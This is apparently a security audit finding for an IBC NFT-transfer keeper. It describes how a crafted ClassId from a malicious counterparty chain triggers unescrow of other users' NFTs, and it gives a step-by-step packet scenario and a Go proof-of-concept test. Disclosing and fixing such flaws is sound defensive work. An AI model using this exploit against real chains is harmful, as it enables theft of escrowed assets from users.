### Title
Malicious IBC Counterparty Can Steal Escrowed NFTs via Crafted ClassId in `processReceivedPacket` — (`x/nft-transfer/keeper/packet.go`)

---

### Summary

`processReceivedPacket` determines whether to mint vouchers or unescrow NFTs solely by calling `IsAwayFromOrigin` on the attacker-controlled `data.ClassId`. A malicious counterparty chain can craft a `ClassId` that begins with its own source port/channel prefix, forcing `IsAwayFromOrigin` to return `false` and triggering the unescrow path. Because the escrow address used for unescrow is derived from the **destination** port/channel (the victim chain's own channel), any NFT legitimately escrowed there by any user can be transferred to an attacker-controlled receiver.

---

### Finding Description

**`IsAwayFromOrigin` logic** (`x/nft-transfer/types/trace.go`, line 49–52):

```go
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
    prefixClassID := GetClassPrefix(sourcePort, sourceChannel)
    return !strings.HasPrefix(fullClassPath, prefixClassID)
}
```

`IsAwayFromOrigin` returns `false` (→ unescrow path) whenever `data.ClassId` starts with `GetClassPrefix(packet.SourcePort, packet.SourceChannel)`. The packet's source port/channel are fixed by the IBC channel handshake, but `data.ClassId` is **entirely attacker-controlled packet payload**.

**`processReceivedPacket` unescrow branch** (`x/nft-transfer/keeper/packet.go`, lines 148–201):

```go
isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)
escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())

// ...
} else {
    unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
        packet.GetSourceChannel(), data.ClassId)
    voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
    for _, tokenID := range data.TokenIds {
        if err := k.nftKeeper.TransferOwner(ctx,
            voucherClassID, tokenID, escrowAddress, receiver); err != nil {
            return err
        }
    }
}
```

The `escrowAddress` is `GetEscrowAddress(destPort, destChannel)` — the **same** address used when the victim's NFT was originally escrowed in `createOutgoingPacket`:

```go
escrowAddress := types.GetEscrowAddress(sourcePort, sourceChannel)
```

These are identical because the victim chain's `sourcePort/sourceChannel` (when sending) equals the attacker packet's `destPort/destChannel` (when receiving).

**`TransferOwner`** (`x/nft/keeper/keeper.go`, lines 121–138) only checks that `srcOwner` is the current owner of the NFT — it does not verify any escrow invariant or that the transfer was authorized by a prior escrow event on the same channel.

**`ValidateBasic`** on `NonFungibleTokenPacketData` (`x/nft-transfer/types/packet.go`, lines 41–71) does not validate that `ClassId` is consistent with the direction of transfer or the channel relationship.

---

### Impact Explanation

**Concrete attack scenario:**

1. Victim on Chain A owns `nativeClass/token1`. They send it to Chain B via `channel-0` (port `nft`). `createOutgoingPacket` escrows `token1` to `escrowAddress("nft", "channel-0")` on Chain A.

2. Malicious Chain B (counterparty on `channel-1`) crafts a packet back to Chain A:
   - `packet.SourcePort = "nft"`, `packet.SourceChannel = "channel-1"`
   - `packet.DestPort = "nft"`, `packet.DestChannel = "channel-0"`
   - `data.ClassId = "nft/channel-1/nativeClass"` (starts with `GetClassPrefix("nft","channel-1")`)
   - `data.TokenIds = ["token1"]`
   - `data.Receiver = attacker_address`

3. On Chain A, `processReceivedPacket` evaluates:
   - `IsAwayFromOrigin("nft", "channel-1", "nft/channel-1/nativeClass")` → `false` (unescrow path)
   - `escrowAddress = GetEscrowAddress("nft", "channel-0")` → holds `token1`
   - `unprefixedClassID = RemoveClassPrefix("nft","channel-1","nft/channel-1/nativeClass")` = `"nativeClass"`
   - `voucherClassID = ParseClassTrace("nativeClass").IBCClassID()` = `"nativeClass"` (empty path → base class returned directly)
   - `TransferOwner(ctx, "nativeClass", "token1", escrowAddress("nft","channel-0"), attacker)` → **succeeds**

4. Attacker now owns `token1` on Chain A. The victim's NFT is stolen.

**Impact:** Unauthorized unescrow of any NFT held by the escrow address to an attacker-controlled address. Any NFT escrowed on the channel is at risk, not just the victim's most recent transfer.

---

### Likelihood Explanation

Requires control of a counterparty IBC chain — a realistic threat model for IBC, since any chain can establish a channel and send arbitrary packet data. No governance, key compromise, or social engineering is needed. The attack is executable by any chain operator running a malicious counterparty.

---

### Recommendation

In `processReceivedPacket`, before taking the unescrow path, verify that the `data.ClassId` prefix corresponds to a legitimate prior escrow: specifically, that the `ClassId` after stripping the source prefix resolves to a class that was actually escrowed on the destination channel. The canonical fix is to check that the `voucherClassID` (after stripping the source prefix) matches a class that was registered as escrowed on `destPort/destChannel`, or alternatively to validate that the `ClassId` prefix matches the **destination** port/channel (not the source), consistent with how the ICS-721 spec defines the return path.

Additionally, `ValidateBasic` on `NonFungibleTokenPacketData` should reject `ClassId` values whose prefix matches the source port/channel (since a legitimate "return" packet from the counterparty should have a `ClassId` prefixed with the **destination** chain's port/channel, not the source's).

### Proof of Concept

```go
func TestMaliciousCounterpartyUnescrow(t *testing.T) {
    // Setup: victim escrows nativeClass/token1 on Chain A via channel-0
    // After SendTransfer, escrowAddress("nft","channel-0") owns token1

    // Attacker crafts packet from Chain B (channel-1) back to Chain A (channel-0)
    maliciousPacket := channeltypes.Packet{
        SourcePort:      "nft",
        SourceChannel:   "channel-1",  // Chain B's channel
        DestinationPort: "nft",
        DestinationChannel: "channel-0", // Chain A's channel
    }
    maliciousData := types.NonFungibleTokenPacketData{
        ClassId:   "nft/channel-1/nativeClass", // starts with source prefix → IsAwayFromOrigin=false
        TokenIds:  []string{"token1"},
        TokenUris: []string{""},
        Sender:    attackerOnChainB.String(),
        Receiver:  attackerOnChainA.String(),
    }

    err := keeper.OnRecvPacket(ctx, "ics721-1", maliciousPacket, maliciousData)
    require.NoError(t, err) // succeeds — token1 transferred to attacker

    owner := nftKeeper.GetNFT(ctx, "nativeClass", "token1").GetOwner()
    require.Equal(t, attackerOnChainA, owner) // victim's NFT stolen
}
```

func (k Keeper) TransferOwner(
	ctx sdk.Context, denomID, tokenID string, srcOwner, dstOwner sdk.AccAddress,
) error {
	if !k.HasDenomID(ctx, denomID) {
		return sdkerrors.Wrapf(types.ErrInvalidDenom, "denom ID %s not exists", denomID)
	}

	nft, err := k.IsOwner(ctx, denomID, tokenID, srcOwner)
	if err != nil {
		return err
	}

	nft.Owner = dstOwner.String()

	k.setNFT(ctx, denomID, nft)
	k.swapOwner(ctx, denomID, tokenID, srcOwner, dstOwner)
	return nil
}

func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}

	if len(nftpd.TokenIds) == 0 {
		return newsdkerrors.Wrap(ErrInvalidTokenID, "tokenId cannot be blank")
	}

	if len(nftpd.TokenIds) != len(nftpd.TokenUris) {
		return newsdkerrors.Wrap(ErrInvalidPacket, "tokenIds and tokenUris lengths do not match")
	}

	if strings.TrimSpace(nftpd.Sender) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "sender address cannot be blank")
	}

	// decode the sender address
	if _, err := sdk.AccAddressFromBech32(nftpd.Sender); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid sender address")
	}

	if strings.TrimSpace(nftpd.Receiver) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "receiver address cannot be blank")
	}

	// decode the receiver address
	if _, err := sdk.AccAddressFromBech32(nftpd.Receiver); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid receiver address")
	}
	return nil
